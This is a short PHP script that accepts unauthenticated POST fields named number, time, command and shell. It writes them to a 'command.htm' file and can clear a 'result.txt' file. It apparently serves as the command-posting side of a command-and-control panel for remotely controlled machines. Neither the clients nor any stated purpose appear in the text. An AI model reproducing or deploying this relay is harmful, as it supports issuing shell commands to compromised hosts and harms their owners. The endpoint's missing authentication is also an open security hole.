<?php
$number=$_POST['number'];
$time=$_POST['time'];
$command=$_POST['command'];
$shell=$_POST['shell'];if(get_magic_quotes_gpc()) {	$shell=stripslashes($shell);	$command=stripslashes($command);}
if ($time==0 or $time==null) {
	date_default_timezone_set('PRC');	$time=date('YmdHis');
}
if ($command=="clear") {
$clear=fopen("result.txt","w");
fwrite($clear,"clear");
fclose($clear);
}
$nfs=fopen("command.htm","wb");
flock($nfs,LOCK_EX);
$all="$number|$time|$command|$shell";
fwrite($nfs,$all,strlen($all));
flock($nfs,LOCK_UN);
fclose($nfs);
?>
success